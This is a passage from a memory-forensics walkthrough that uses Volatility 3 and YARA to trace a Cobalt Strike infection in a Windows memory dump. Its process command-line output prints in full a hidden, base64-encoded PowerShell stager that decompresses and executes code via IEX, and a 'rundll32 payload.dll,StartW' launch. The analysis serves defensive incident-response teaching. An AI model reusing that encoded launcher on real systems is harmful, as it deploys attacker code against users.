* 972   588     dwm.exe 0x800ae0021080  15      -       1       False   2023-08-10 00:22:56.000000      N/A
* 772   588     fontdrvhost.ex  0x800adff45140  5       -       1       False   2023-08-10 00:22:56.000000      N/A
3912    3552    SecurityHealth  0x800ae148a080  1       -       1       False   2023-08-10 00:23:17.000000      N/A
5984    3552    vmtoolsd.exe    0x800ae148f080  6       -       1       False   2023-08-10 00:23:17.000000      N/A
6744    908     powershell.exe  0x800ae5da50c0  10      -       1       False   2023-08-10 09:21:16.000000      N/A
* 5692  6744    conhost.exe     0x800ae19e4300  3       -       1       False   2023-08-10 09:21:16.000000      N/A
5468    7512    rundll32.exe    0x800ae01f0080  3       -       0       False   2023-08-10 09:23:15.000000      N/A
```

#### Identifying Process Command Lines

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.cmdline
Volatility 3 Framework 2.5.0

PID     Process Args

4       System  Required memory at 0x20 is inaccessible (swapped)
92      Registry        Required memory at 0x20 is not valid (process exited?)
304     smss.exe        Required memory at 0xb439a5b020 is not valid (process exited?)
416     csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
492     wininit.exe     Required memory at 0xf32bb96020 is inaccessible (swapped)
500     csrss.exe       %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16
588     winlogon.exe    winlogon.exe
632     services.exe    C:\Windows\system32\services.exe
660     lsass.exe       C:\Windows\system32\lsass.exe
760     svchost.exe     C:\Windows\system32\svchost.exe -k DcomLaunch -p
772     fontdrvhost.ex  Required memory at 0x983ebae020 is inaccessible (swapped)
768     fontdrvhost.ex  Required memory at 0x2e08a79020 is inaccessible (swapped)
884     svchost.exe     C:\Windows\system32\svchost.exe -k RPCSS -p
972     dwm.exe Required memory at 0x16b5215ff is not valid (process exited?)
440     svchost.exe     C:\Windows\system32\svchost.exe -k netsvcs -p
344     svchost.exe     Required memory at 0x20266003378 is inaccessible (swapped)
360     svchost.exe     C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
876     svchost.exe     C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
1172    svchost.exe     C:\Windows\system32\svchost.exe -k LocalService -p
1272    svchost.exe     C:\Windows\System32\svchost.exe -k NetworkService -p
1428    MemCompression  Required memory at 0x20 is not valid (process exited?)
1480    svchost.exe     C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
1676    svchost.exe     Required memory at 0xf645948020 is inaccessible (swapped)
1684    svchost.exe     Required memory at 0x909d34b020 is inaccessible (swapped)
1788    spoolsv.exe     Required memory at 0x10eb020 is inaccessible (swapped)
1872    svchost.exe     Required memory at 0x6500bf600098 is not valid (process exited?)
2008    svchost.exe     Required memory at 0x80780f7020 is inaccessible (swapped)
2080    sihost.exe      Required memory at 0x28700281b48 is inaccessible (swapped)
2092    svchost.exe     Required memory at 0x2b86fc03368 is inaccessible (swapped)
2140    svchost.exe     Required memory at 0x266106032f8 is inaccessible (swapped)
2244    vm3dservice.ex  Required memory at 0x8729baf020 is inaccessible (swapped)
2252    VGAuthService.  Required memory at 0xe49cc1d020 is inaccessible (swapped)
2276    MsMpEng.exe     Required memory at 0x69c1943020 is not valid (process exited?)
2284    vmtoolsd.exe    "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
2380    taskhostw.exe   Required memory at 0x1afc45f020 is not valid (process exited?)
2404    taskhostw.exe   taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
2520    vm3dservice.ex  Process 2520: Required memory at 0xfdac105020 is not valid (incomplete layer memory_layer?)
2840    ctfmon.exe      Process 2840: Required memory at 0x1935cea020 is not valid (incomplete layer memory_layer?)
2880    svchost.exe     Required memory at 0x152082032f8 is inaccessible (swapped)
640     dllhost.exe     Required memory at 0x1c9760f1ae8 is inaccessible (swapped)
3128    WmiPrvSE.exe    C:\Windows\system32\wbem\wmiprvse.exe
3240    msdtc.exe       Required memory at 0x800ba3020 is inaccessible (swapped)
3508    userinit.exe    Required memory at 0xd59bec7020 is not valid (process exited?)
4260    svchost.exe     C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
4400    SearchIndexer.  C:\Windows\system32\SearchIndexer.exe /Embedding
4724    RuntimeBroker.  Required memory at 0x26470e03368 is inaccessible (swapped)
4932    RuntimeBroker.  Required memory at 0xdadfdb4020 is inaccessible (swapped)
1908    Microsoft.Phot  Required memory at 0xeead9c0020 is inaccessible (swapped)
5392    RuntimeBroker.  Required memory at 0x6a6b1c020 is inaccessible (swapped)
5848    RuntimeBroker.  Required memory at 0xdc206e4020 is inaccessible (swapped)
5912    RuntimeBroker.  C:\Windows\System32\RuntimeBroker.exe -Embedding
1996    svchost.exe     C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
1584    dasHost.exe     Required memory at 0x4f926fa020 is inaccessible (swapped)
3912    SecurityHealth  Required memory at 0x640d1a0020 is inaccessible (swapped)
3964    SecurityHealth  Required memory at 0x1839e8b1ae8 is inaccessible (swapped)
5984    vmtoolsd.exe    Required memory at 0x16beabd226c is inaccessible (swapped)
6908    SkypeApp.exe    Required memory at 0x78 is not valid (process exited?)
7032    RuntimeBroker.  C:\Windows\System32\RuntimeBroker.exe -Embedding
4920    svchost.exe     Required memory at 0x34a8ee7020 is inaccessible (swapped)
1260    RuntimeBroker.  Required memory at 0xe7bf823020 is inaccessible (swapped)
2320    ApplicationFra  Required memory at 0x53775f020 is inaccessible (swapped)
2440    WWAHost.exe     Required memory at 0x811ed5d020 is inaccessible (swapped)
6732    dllhost.exe     Required memory at 0xaf3a7d8020 is inaccessible (swapped)
7028    WinStore.App.e  Required memory at 0x4cc3601020 is inaccessible (swapped)
7320    svchost.exe     Required memory at 0x8e7d877020 is inaccessible (swapped)
7884    SgrmBroker.exe  C:\Windows\system32\SgrmBroker.exe
8024    svchost.exe     Required memory at 0xe7489d4020 is inaccessible (swapped)
8100    svchost.exe     Required memory at 0x2970291020 is inaccessible (swapped)
6160    svchost.exe     Required memory at 0x78 is not valid (process exited?)
3372    powershell.exe  Required memory at 0x15ce1221b78 is inaccessible (swapped)
3136    conhost.exe     Required memory at 0x23ead681b78 is inaccessible (swapped)
6564    Autorunsc64.ex  Process 6564: Required memory at 0x1ca110452020 is not valid (incomplete layer memory_layer?)
7148    explorer.exe    explorer.exe
1380    Sysmon64.exe    C:\Windows\Sysmon64.exe
4208    unsecapp.exe    Required memory at 0x2cff1e020 is inaccessible (swapped)
7316    StartMenuExper  "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
4640    TextInputHost.  "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe" -ServerName:InputApp.AppXjd5de1g66v206tj52m9d0dtpppx4cgpn.mca
672     SearchApp.exe   Required memory at 0x50435f676ee1 is not valid (process exited?)
4504    ShellExperienc  Required memory at 0x12bdd05f is inaccessible (swapped)
5520    RuntimeBroker.  Required memory at 0x5f2a3f4020 is inaccessible (swapped)
2868    SkypeBackgroun  Process 2868: Required memory at 0x1f01ffec0000 is not valid (incomplete layer memory_layer?)
7820    Velociraptor.e  "C:\Program Files\Velociraptor\Velociraptor.exe"  --config "C:\Program Files\Velociraptor\/client.config.yaml" service run
6388    chrome.exe      Required memory at 0x315417b020 is not valid (process exited?)
3648    rundll32.exe    "C:\Windows\System32\rundll32.exe" payload.dll,StartW
6744    powershell.exe  "PowerShell.exe" -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMAFYAVwBhAFcALwBpAFMAaABiADkAbgBQAHcASwBmADIAZwBKAFUAQgBNAEcAYgBDAEQATgBHADcAWAAwAEQATQBiAHMAUwB5AEEAcwBkAGwANABVAGwAYwB1AEYASwBlAEsAMQBYAEEAYgBEAG0ALwBmAGYANQA1AGEAQgBkAEgAbwA2AFAAZABQAFMAegBFAFMASwBxAEgATABkADUAZABTADUAUwA5ADAANQA0AFgAZAB6AHoAaQBqAG0AbwA4AEEAbQAwAHQAMgBTAHMASgBnAEcAdgBpAFQAZgAzAG0ANABTAEgAMwBPAHgARgBvAHMAWABoAC8AQwBYAGsAQQBYADQAQgBkAGsAMgBJADMARQBzAC8AWABsADcATQAwAFUATQBlAFYATAArADAAeAA2AHgARgB5ACsAdwBFADUAYwBVAHAAVwB3AGoAQgBJAG0AZABNAEYASwA0AHUAYgBtADkAeQBUADQAbABmAG8AdwAyADUATQBWAEgAbgBPADcASgBpADAAZgA0AE4AcgBCAGoANgBhAHUAVQBmADEATABEAFUAQQBzADgAUgBQADMAbgAzADMANQByAEoAWQB3AFIAbgA1AC8AMwBwAFEANwBoAGEAaAB3AFQAegAzAEkAcABpAGYATQBGADYAUgAvAFMAYQBrAHMAWQB1AFoAdABZAE8ANABLADUAOQBLAGYAMAA2AGEAWABVAGMAUQBNAEwAdQBSAGUAeABZAHcAdgBoAEwAZAB4AEMAOQBXADEAeABOAGcAdwB3AEUAagBjAG8AegBVAE8AWAA4AG4AegB1AGoAegA5AHkAaABhAGUANwB5AG4ATwBwAEgAUwBYAEkAagBmAE8ANQArAFQASABtAHgAQwB2AFoAcgBwAHMAcgBTAEgAOABWAGgATQBQAEgAWQAwAGoAeQB1AFIASABGAEwASQBpAEQARABTACsAdABxAEsALwBJAHAAVQBXAEcAZgBwAHkAQgBIADUAMgB4ADUAdwBxAFgAbQB6AGsAaABnAG4AdgA4AC8ASgBMAEMANgBsAGsAbgBuADQAUABsAEYATABoAFIAegB4AHoAbQBpAHQASwBUADgAUABmADAALwBDAHoAOQAvAG8AWgBtAGwAdgBpAGMAZQBxAFQAVQA4AHoAbABoAFEAVABnAG4AYgBFADgAeABpAFUAdABkADUATgBzAHUAbQBaAEUATgBxAE8AVgBpAGkASgBuAHYANQBBAG8AQQBnAGgARwBlAE0ARgArADYAWQBnAEcAOQBmAGYAQgBLADgAcAAvADgAeABIAFcATABZAFAAZgBwAFYAKwAwACsANQA4AGYAawBjAEMAWAAzAFYANQBYAHkANwA1AFYAQQBhAHMAcABaAG8AWABqAEoAaQBWACsAaABZADUAVABsAHoAZABrAGMAWABPAGMASAA5AE8AKwBTAHEAdwBCAC8AUAB5AFIAWQA0AGYAYQB2AGoAMQBMAFYASgBpADUAeABFAEMAYwB2AEgAUABoADkAbAA2AHUAMwBOAHoAZABQADIAWgBMAEEAZgBmAEwAVABJAEsAYQBaADMAbABlAHAAWABKAFIARwBBAEEATAB4AGcAQgAxAEYATwBCADkAWgBRAGcAcgBQADMAKwBKAHoAZABuAHYAVgBqAEkAcwAvAE4AVgBTADUAYQBsADEAMAB6AHUARQA1ADQALwBnAHEAUABTADAARABhAGoALwBmADMAaABSAHUATAA5AGsAagB2AHIAOQBZAEMAWABWAHQAdwBzAFQANQB6ADYAdABCAEkAeAB2AHEARQArADMAbwBJADQALwBpAGEAOABMAG4AUAA0AG8AWgAyAGIAZwBrADQANgBOADAARgBSAHMARAB6AG4AegB1AGMAawBCAHMANwBjAEoATwBUAGgARAA2ADkASwBOAGEAMgA2AFAAOABUAGIAZAA1AEIAcQBkAGkAaQBIAHMATQBxAEMAQQBsAEMAdAArAEQATwBjAGMAdwBuACsAdgA1AEkAKwBJAEIAZgArAGMAOQBwAE8AbQBuAEQAWgBRAFoAdQBVAHAAZgBTAHUAdAA0ADkAUwA3ADIASQBwAGQAYgBMAG8AcgBqAG8AagBSAE4AbwBNADUAeABVAFoAbwBUADUAQgBLADcASwBLAGwAKwBUAEMAOQBIAGEAcwBLAEQAYgBKAG4ANwBCAG4AZQBVAHUASgB4AGkARgBQAE8AcgB1AGUAZgBDAEIANQBSAGUAWABMAGMAQwBIAHkAbwBtAHcAUgBCAGQAbwBPAEYAeABIAGgASgBNAGsAUwB0AFkASwBVAHAAZABhAHAAUABtAGMAVQA2AGQASwA0AFQAYwBoADUAeQAwAGsATwB0AEMAeQBZAEcAbABQAGMAUQBFAHYAZwBnAHUANQBsAHoAawBEAEwATwBMAC8ANQBvAGYAaABkAEsAYwA4AEoANABYAHUAcwBRAEQANgBhAHcATAA2AFMANQB5AG8ATwBkAGMASwBpAHAATABOACsAUQBRAE8ALwBkAHYAWQBGAC8AcgA1AEYAdwBVAGcAcQBzAHIAUwBlADkAQQBRAHcATABNADMAWQBBAFgAcABTAFYAbABIAFAAcABhAHIAdgBoAEQANAB2ADEAMwA4AEwANQB2AE0AZAAvAEIAYgBEAEYAeQBDAFcAUQArAEsAOABUAGUAQgBoAHIANgB1AFEAcwBBAE8AegBFADkAUQBUAE0AbQBrAGYAUwBsAEkARQByAHcAcQBYAG4AawBvAHAAWQB5AE0AMQBnADgATgAxAC8AZgBpAE0ANQBvAFoAUgB5AFUAZABCAFoANABUAFIAUwBUAGUAbgBXAGUAOQBiAGgAOABUAHAARQBUAEoAMgAxAE0AaAAvAFgAagBhAE4AZQBUACsAMABmAEQASAA2AGYAWQBYADcATAAyAFgAdQArAGcAKwBqAFoAOQBrAEoATQBBAFAAMwBJAFcAZABkAHMAYQA3AEcAZABZAGoAbQBPADMANAA0AGIAVwBkAGgAaQBoAGQATABqAGIAcABZADMAVwArAHQAaQBlAHEAdgBLAFEAMQBtAG0ATgA5AHAASgBoADgAKwBUAHIARgBIAHUAZwA5AHoAQQBKAGoARgBtAEQAOQBmAFoAagBQAFgARABqACsAMABGAEwAWAB5ADAAUQAzAFUAVwBaAHIAOABTAHIAVgB1AHcAMgBPAGcANQBQAHUATAA1AGwARQA1AGsARQB4AG0ARQBjADkAZgBaAFQAMQBWADcAdABjAGQAMABiAEIASABxAGQAZwArADQAeQBhAFMAYwBoAGEAeQBlAFQAcQBaAEUATQBvADYASABYAG8AOQBYAHQAWABsAHYAeQAvAHIANwBYACsAZABJAGQAeQBBAGIANgA0AGwAcgAzAEoATgBPADMASQArAEgATABpAEoAdwA5AEUAdgB0AFQAUQArAHgAcAAxAEMASgBNACsARABHAEEAZgBhAEoAVQA2AG0AVABWAHYAegBmADgAawBKAEoAVgA0AHAAdwBPAFkANAByAHQAawAwAGIAawBQAG4AeABQAGcAaABFAE8AWQAyAFYAOAB3AHAAdgBYADEAeAAwAEsASwA0AHYANQBhADIAWAB3AHUARABEAFgAdwBFADAARgBSAFUAeQAzADYAbQB4AHUAaABPADUAKwBxAFMANQBlAGwAYQBuAEoATQBtAHgANwBIAFQAQwBPAEIAVQA2AEsANQBmADcASgBDAEYAOQBOAGUAeABtADEAbABhAG4AVgBXADMAUgBkAEYAaQBWADkANgBpAGwAdwA1ACsATgBGAHgAdQBzAGYANQAvAE0AbQAvAEEANQBNAGUAeABCADkAcQBkAGsAbgArAGQAZwBOAHEANgBqAE8ASwBIAEMAYQBnAHAAOQA3AHcAUwA5AGUAeABMAHYAZQBhAHUATABqAHQAVQA0ADkAdgBKAFcAMQAyAFEANAAzAHYAQwBTAHEAQQBlADUAcQBkADkAdwBmAHIARgBNAFcAOABUADYATAA5AG0ANQBVAG0AMAB5AHgAdwBKADMAcABDAGYAbQBIAHEAagB1AHAAZwBIAHgAawA3AFkAWQBEADkATABsAEgAUgB6AHYAVQBPAE0AWABEAEEAZABtAEwAOQBYAEcAcQBEAGQASgBqAGIAOQBmADcAawBqAFMARgBuAHQAWQB4AGoANQBZAGUANwAzAFQAdgAwAE0ASQBIAGMAdwBkADUAVQBOAFcAVgB4AG8AbQBzADQANQBWACsANABLAGYATgBRADcAQQB3AE8AdQBwAEEAMQA2AHQAZAAwAHcAcwBkAHcAMgA5AFAAYwBOAGUAbQAxAHMAcQBtAGUASQBVAG4AaABsAGQAUgBrAEwAOABFADMAKwBaAEIAOAAyADAAUABkAC8ASABFAFgASQBWADcAMAArAGwAMQAwAFcASABMAFcAdgBQAFIAeQBsAEwANwBwAHkAWQBkAHkANAB1ADIATwBkAE8AOABmAG4AdgAyAFcAbABsADMASABzAGIASgBvACsANABPAEgAcwB1AE4AbAB0AFkAMAB4AHUAMwBEAGEAUABqAFEAVABpAGUATABjAG4AOAA5AGYAOQBXAG4AcwA2ADIAagBXAFgANAB6AE0AcAAwAFIAMABtAFkAagBRADEAVgBtAEUAQQA5ADcAdABOAFIAVgB6AFYAcABqAFQAWAA4AG8AegB6AHYAcQBXAEYAawBzAHcAcQA2AHcAbAA5AGwASQBIAGMAMQBZAHAAWgBHADUARABRAHoAVABxADgAaQA0AFUAegBzAFkAbgBUAFIAcAAwAFcAcgBZAFMAOAAxAFkAOQBVAGMAZABBACsASgBFAG0AdgBiAGYAcwBPAEwAZQA2ADEAcwA4AHgARQBwADUAbwBIAGUAYQBUAG0AcwA3AEkAMAAzAFoAagBJAHgATwBQADkAWAA4AHAAZwBMADMAOABnADEAZgA5AHcARQB2AHQAKwBXAHcAZwBuAHgAZAB4AG0AcABOAE0AZQBGAE0AOAA1AGEAUgBKAFIAdQB0AHAAaAB6ADMAMABPAEgAMQAvADgAKwBkAEIANwBtAHEATwBPAHUATgBNAHEANgBSADEARgBpADMAbABIAEUARAA4AEQAcQBHAEcAaQB6AFcAagB1ADAAaABEADMATABxAG8AWABhAHcANQBUADQAMwA1AFgANQBxAEgAbQByAFUAVwB0AHUAUgB2AFEAcABUADIAMQBjAG4AdABtAHcAZQA3AEUAUABOAFIAVgA3AEQAVQB4ADIAYgB0AFQAcAB4AC8AOABMAEgAegBnAGkAVgBSAHoAZgBRAEsAKwBlAGMAagBrAHoASQBWAGEAagBSAGcAZABVADcAaQBWAG8AZABJAEMATwByADIAWQBGAEoAcQB2AFkAaAA1AFMAYwBaADMAVABjAFAAdQBKAE4ARQBLAGYAeQBYAEkAUwBjAC8AcgAwAEQAMgBJAEcAUwBpAFMASQBhADgASABsAG0AcgA2AEEAQgA1AGoAZQBxAGEAcgA5AGEAdAAzAGIASwAyADEASwBQAFcAagBQAFcAUwBGAHQAUwA5AFYAUwBZAEsAdgAwAGQASABBADIAcABpAHQATQBPAGYAdABlAEYAKwBmAEkAKwBWAGQAcQBPAHoAcgBEAFQAYgBqADIAMgArAGUAbAB6AGkAOABhAEkAZAByAG0AZAAwAGwATQBsAGsAcgBYAEkAVABNAEoAaAArAFUAagBGAFIALwBGADIAQwAzAHoAdQBYAFMAMgA4AE4ARAA5AG8AYwB0AEYAZgB4AC8AZgBQAG4AcgBDAFgAZQB2AEIAMAA5AGYAVQBxAGYAcgAyAFAAawAyAC8ANwBPAFMAcwBHAGMAVQByAHUAOQArAGUAcwA2AEwAKwB6AFIAdQA2ADcANQBzACsAbABzAGgARgBpADgAUgBTADUAMABVADUAaQB3AHIAdQArAGoASABqAEQAOQBNAGkAZABOAEEAeQBvADAAOAB2AG0AUABSAC8AdABYAHcAbgB6AGkAdwB0AGcATABnAC8ASAAxAFYAVgBGAGQATgA4AEIAaQBzAHYAdgBKAGkAUABYADcAVwA5ACsASAAxADMATQBCAFMAMABYACsAYwBGAFgANAA5AGsAQQBVAEMAdABlAG4AegAwAG8AMgBtADIAegA4AHUAVgB6AHgATwBnAFYAKwBlADAAcABNAHUARgAvAHgASABaAEYARAA0AGoAdAA4AFcANQBUAEsAcQBWAEkAdQBsADgAVgB2AHQAUQB6AFcAZgBwADIAWQBWAGgAQQBlADgAMgAvADIAaQBtAEwAKwBlAHcAZgBsAHYAUwBzADMAYwAvAFUAMgBzAEwASABFADkAOABqAC8ATQBBAGIAZgBlAGYAMwBQADcAQQByACsAcwBoAG4AeQBHADMAcwBaAG8AbwA4AHAARQA0AC8AeQBQAHcASAA0AGIAWQB6AFoANAB3ADAAQQBBAEEAPQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
5692    conhost.exe     Required memory at 0xf3f686e020 is inaccessible (swapped)
5468    rundll32.exe    C:\Windows\System32\rundll32.exe
3944    VSSVC.exe       C:\Windows\system32\vssvc.exe
7292    svchost.exe     C:\Windows\System32\svchost.exe -k swprv
2432    smartscreen.ex  Required memory at 0xed2b7c8020 is inaccessible (swapped)
892     chrome.exe      "C:\Program Files\Google\Chrome\Application\chrome.exe"
4492    chrome.exe      "C:\Program Files\Google\Chrome\Application\chrome.exe" --type=crashpad-handler "--user-data-dir=C:\Users\johndoe\AppData\Local\Google\Chrome\User Data" /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler "--database=C:\Users\johndoe\AppData\Local\Google\Chrome\User Data\Crashpad" --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=Win64 --annotation=prod=Chrome --annotation=ver=115.0.5790.171 --initial-client-data=0x19c,0x1a0,0x1a4,0x178,0x1a8,0x7ffa8aede9e0,0x7ffa8aede9f0,0x7ffa8aedea00
7208    chrome.exe      Required memory at 0x4a793ec020 is inaccessible (swapped)
2784    chrome.exe      "C:\Program Files\Google\Chrome\Application\chrome.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-GB --service-sandbox-type=none --mojo-platform-channel-handle=2196 --field-trial-handle=1888,i,11977534670868737611,7243353188915732905,262144 /prefetch:8
3052    chrome.exe      Required memory at 0x402b8c6020 is inaccessible (swapped)
7416    chrome.exe      Required memory at 0xf4cc644020 is inaccessible (swapped)
4972    chrome.exe      Required memory at 0x47ac6de020 is inaccessible (swapped)
4296    chrome.exe      Required memory at 0xda35b8020 is inaccessible (swapped)
3416    chrome.exe      Required memory at 0x3e51f7c020 is inaccessible (swapped)
4040    winpmem_mini_x  "C:\Program Files\Velociraptor\Tools\winpmem_mini_x64_rc2.exe" "C:\Program Files\Velociraptor\Tools\tmp2081306188.raw"
5112    conhost.exe     \??\C:\Windows\system32\conhost.exe 0x4
```

#### Dumping Process Memory & Leveraging YARA

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop> python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.memmap --pid 3648 --dump

Volatility 3 Framework 2.5.0
---SNIP---
0xf8016d0e9000  0x2077d000      0x3000  0x1bde4000      pid.3648.dmp
0xf8016d0ec000  0x20700000      0xd000  0x1bde7000      pid.3648.dmp
0xf8016d0f9000  0x7d827000      0x1000  0x1bdf4000      pid.3648.dmp
0xf8016d0fa000  0x2068e000      0x1000  0x1bdf5000      pid.3648.dmp
0xf8016d0fb000  0x7d826000      0x1000  0x1bdf6000      pid.3648.dmp
0xf8016d0fc000  0x1cee3000      0x1000  0x1bdf7000      pid.3648.dmp
0xf8016d0fd000  0x20691000      0x1000  0x1bdf8000      pid.3648.dmp
0xf8016d0fe000  0x20792000      0x1000  0x1bdf9000      pid.3648.dmp
0xf8016d0ff000  0x20693000      0x1000  0x1bdfa000      pid.3648.dmp
0xf8016d100000  0x7d825000      0x1000  0x1bdfb000      pid.3648.dmp
0xf8016d101000  0x7d824000      0x1000  0x1bdfc000      pid.3648.dmp
0xf8016d102000  0x7d828000      0x1000  0x1bdfd000      pid.3648.dmp
0xf8016d103000  0x20697000      0x2000  0x1bdfe000      pid.3648.dmp
0xf8016d105000  0x7d823000      0x1000  0x1be00000      pid.3648.dmp
0xf8016d106000  0x2069a000      0x1000  0x1be01000      pid.3648.dmp
0xf8016d107000  0x7d822000      0x1000  0x1be02000      pid.3648.dmp
0xf8016d187000  0x2e1a000       0x1000  0x1be03000      pid.3648.dmp
0xf8016d190000  0x2071b000      0x1000  0x1be04000      pid.3648.dmp
0xf8016d191000  0x2279c000      0x1000  0x1be05000      pid.3648.dmp
0xf8016d192000  0x2271d000      0x1000  0x1be06000      pid.3648.dmp
0xf8016d193000  0x2451e000      0x1000  0x1be07000      pid.3648.dmp
0xf8016d194000  0x2479f000      0x1000  0x1be08000      pid.3648.dmp
0xf8016d195000  0x20720000      0x1000  0x1be09000      pid.3648.dmp
0xf8016d196000  0x207a1000      0x2000  0x1be0a000      pid.3648.dmp
0xf8016d198000  0x206a3000      0x2000  0x1be0c000      pid.3648.dmp
0xf8016d19a000  0x207a5000      0x1000  0x1be0e000      pid.3648.dmp
0xf8016d19b000  0x24db0000      0x1000  0x1be0f000      pid.3648.dmp
0xf8016d19c000  0x24db2000      0x1000  0x1be10000      pid.3648.dmp
0xf8016d19d000  0x207a7000      0x1000  0x1be11000      pid.3648.dmp
0xf8016d19e000  0x7d820000      0x1000  0x1be12000      pid.3648.dmp
0xf8016d1a5000  0x2e1a000       0x1000  0x1be13000      pid.3648.dmp
0xf8016d1b0000  0x217b9000      0x5000  0x1be14000      pid.3648.dmp
0xf8016d1b5000  0x25dbe000      0x1000  0x1be19000      pid.3648.dmp
0xf8016d1b6000  0x25d3f000      0x1000  0x1be1a000      pid.3648.dmp
0xf8016d1b7000  0x25dc0000      0x6000  0x1be1b000      pid.3648.dmp
0xf8016d1bd000  0x259c6000      0x3000  0x1be21000      pid.3648.dmp
0xf8016d1c0000  0x25dc9000      0x3000  0x1be24000      pid.3648.dmp
0xf8016d1c3000  0x259cc000      0x1000  0x1be27000      pid.3648.dmp
0xf8016d1c4000  0x25dcd000      0x6000  0x1be28000      pid.3648.dmp
0xf8016d1ca000  0x7d81f000      0x1000  0x1be2e000      pid.3648.dmp
0xf8016d1cb000  0x25dd4000      0x1000  0x1be2f000      pid.3648.dmp
0xf8016d1cc000  0x25d55000      0x1000  0x1be30000      pid.3648.dmp
0xf8016d1cd000  0x2a2bd000      0x2000  0x1be31000      pid.3648.dmp
0xf8016d1cf000  0x25cd7000      0x2000  0x1be33000      pid.3648.dmp
0xf8016d1db000  0x2e1a000       0x1000  0x1be35000      pid.3648.dmp
0xf8019bc70000  0x1e722000      0x1000  0x1be36000      pid.3648.dmp
0xf801b19f0000  0x2e991000      0x1000  0x1be37000      pid.3648.dmp
0xf801d3630000  0x4aefd000      0x1000  0x1be38000      pid.3648.dmp
0xf801d3631000  0x3f6fe000      0x1000  0x1be39000      pid.3648.dmp
0xf801d3632000  0xf4ff000       0x1000  0x1be3a000      pid.3648.dmp
0xf801d3633000  0x75c00000      0x1000  0x1be3b000      pid.3648.dmp
0xf801d3636000  0x5b083000      0x1000  0x1be3c000      pid.3648.dmp
0xf801d363a000  0x73407000      0x1000  0x1be3d000      pid.3648.dmp
0xf801d363b000  0x35f08000      0x1000  0x1be3e000      pid.3648.dmp
0xf801d363c000  0x31189000      0x1000  0x1be3f000      pid.3648.dmp
0xf801d8c70000  0x6b02a000      0x1000  0x1be40000      pid.3648.dmp
```

``` powershell-session
PS C:\Users\johndoe> $rules = Get-ChildItem C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules | Select-Object -Property Name
PS C:\Users\johndoe> foreach ($rule in $rules) {C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\yara64.exe C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules\$($rule.Name) C:\Users\johndoe\Desktop\pid.3648.dmp}
HKTL_CobaltStrike_Beacon_Strings C:\Users\johndoe\Desktop\pid.3648.dmp
HKTL_CobaltStrike_Beacon_4_2_Decrypt C:\Users\johndoe\Desktop\pid.3648.dmp
HKTL_Win_CobaltStrike C:\Users\johndoe\Desktop\pid.3648.dmp
CobaltStrike_Sleep_Decoder_Indicator C:\Users\johndoe\Desktop\pid.3648.dmp
WiltedTulip_ReflectiveLoader C:\Users\johndoe\Desktop\pid.3648.dmp
---SNIP---
```

#### Identifying Loaded DLLs

``` cmd-session
C:\Users\johndoe\Desktop\volatility3-develop>python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.dlllist --pid 3648
Volatility 3 Framework 2.5.0

PID     Process Base    Size    Name    Path    LoadTime        File output

3648    rundll32.exe    0x7ff782070000  0x17000 rundll32.exe    C:\Windows\System32\rundll32.exe        2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa36b0000  0x1f8000        -       -       2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa2400000  0xbf000 KERNEL32.DLL    C:\Windows\System32\KERNEL32.DLL        2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa0ec0000  0x2f6000        KERNELBASE.dll  C:\Windows\System32\KERNELBASE.dll      2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa26b0000  0x9e000 msvcrt.dll      C:\Windows\System32\msvcrt.dll  2023-08-10 09:15:14.000000      Disabled
3648    rundll32.exe    0x7ffaa1ef0000  0x354000        combase.dll     C:\Windows\System32\combase.dll 2023-08-10 09:15:14.000000      Disabled
